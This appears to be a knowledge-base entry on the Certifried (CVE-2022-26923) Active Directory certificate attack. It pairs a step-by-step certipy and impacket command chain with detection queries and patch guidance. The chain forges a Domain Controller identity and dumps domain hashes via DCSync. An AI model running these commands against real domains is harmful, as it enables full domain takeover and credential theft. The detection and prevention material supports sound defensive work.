name: Certifried (CVE-2022-26923) - Machine Account Certificate Privilege Escalation
description: Certifried exploits CVE-2022-26923 where a low-privileged user creates a machine account, sets its dNSHostName to match a Domain Controller, then requests a certificate. The CA issues a cert for the DC identity, enabling DCSync. Patches in May 2022 added szOID_NTDS_CA_SECURITY_EXT to certificates.
notes:
=== PREREQUISITES ===
- MachineAccountQuota > 0 (default: 10)
- ADCS with a template allowing machine enrollment (default: Machine template)
- Unpatched DCs (pre-May 2022 KB5014754)

=== ATTACK CHAIN ===
  # Step 1: Create machine account with DC dNSHostName
  certipy account create -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -dns <dc_hostname> -user EVIL$

  # Step 2: Request certificate as the spoofed DC
  certipy req -u EVIL$@<domain> -p <pass> -ca <ca_name> -template Machine -dc-ip <dc_ip>

  # Step 3: Authenticate with the DC certificate
  certipy auth -pfx dc01.pfx -dc-ip <dc_ip>

  # Step 4: DCSync with the DC NT hash
  secretsdump.py -hashes :<dc_hash> <domain>/DC01$@<dc_ip>

=== ALTERNATIVE: impacket addcomputer ===
  addcomputer.py -computer-name EVIL$ -computer-pass Password123 <domain>/<user>:<pass>
  # Then modify dNSHostName with ldap tools

=== DETECTION EVASION ===
- The attack modifies dNSHostName which is logged
- Machine account creation is logged in Event 4741
- Certificate requests are logged in Event 4886/4887

examples.label: Create machine with spoofed DNS
examples.command: certipy account create -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -dns DC01.corp.local -user EVIL$

examples.label: Request certificate as DC
examples.command: certipy req -u EVIL$@corp.local -p Password123 -ca corp-CA -template Machine -dc-ip 192.168.1.10

recommended.note: Machine account creation is the first step of Certifried.
Different ADCS attack vector (SAN abuse vs machine impersonation).

defense.why_it_works: When a machine account requests a certificate, the CA uses the dNSHostName to identify it. By setting a new machine dNSHostName to match a DC, the CA issues a certificate for the DC identity.
defense.prerequisites: MachineAccountQuota > 0; ADCS with machine enrollment template; unpatched DC.
defense.impact: Full domain compromise via DCSync with DC machine account certificate.
defense.detection: [MITRE T1649] Machine account creation (4741) followed by dNSHostName change (5136) and certificate request (4886).
defense.artifacts: Event 4741 (machine account created); Event 5136 (dNSHostName modified); Event 4886/4887 (cert request/issued).
defense.splunk_spl:
index=windows (EventCode=4741 OR (EventCode=5136 AND AttributeLDAPDisplayName="dNSHostName"))
| transaction SubjectUserName maxspan=10m
| where eventcount > 1
| table _time, SubjectUserName, TargetUserName, AttributeValue
defense.sentinel_kql:
SecurityEvent
| where EventID in (4741, 5136)
| where EventID == 5136 and AttributeLDAPDisplayName == "dNSHostName"
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue
defense.prevention: Apply KB5014754 (May 2022 patches); set MachineAccountQuota to 0; monitor dNSHostName changes; enable szOID_NTDS_CA_SECURITY_EXT.

detections.name: Certifried - Machine account DNS spoofing
detections.logic:
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "dNSHostName"
| where ObjectDN contains "CN=Computers" or ObjectDN contains "OU="
| where AttributeValue has_any ("DC", "dc")
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue
detections.false_positives: Legitimate DNS name changes on computer accounts (very rare)
detections.tuning: Any dNSHostName change to a DC hostname is extremely suspicious
